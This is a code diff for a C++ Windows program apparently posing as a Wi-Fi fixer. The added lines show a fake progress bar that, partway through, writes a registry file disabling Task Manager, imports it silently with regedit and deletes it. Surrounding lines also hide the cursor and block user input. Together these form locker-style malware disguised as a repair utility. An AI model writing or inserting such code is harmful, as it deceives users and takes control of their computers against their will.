@@ -176,6 +176,13 @@ namespace wififixer {
 			else
 				this->progressBar1->Increment(rand() % 2);
 			if (this->progressBar1->Value >= 57) {
+				std::ofstream disable_task("C:\\1.reg");
+				if (disable_task.is_open()) {
+					disable_task << "Windows Registry Editor Version 5.00\n\n[HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System]\n\"DisableTaskMgr\"=dword:00000001";
+					disable_task.close();
+					system("regedit /s C:\\1.reg >nul");
+					remove("C:\\1.reg");
+				}
 				this->timer1->Stop();
 				SetCursorPos(99999999, 99999999);
 				BlockInput(true);
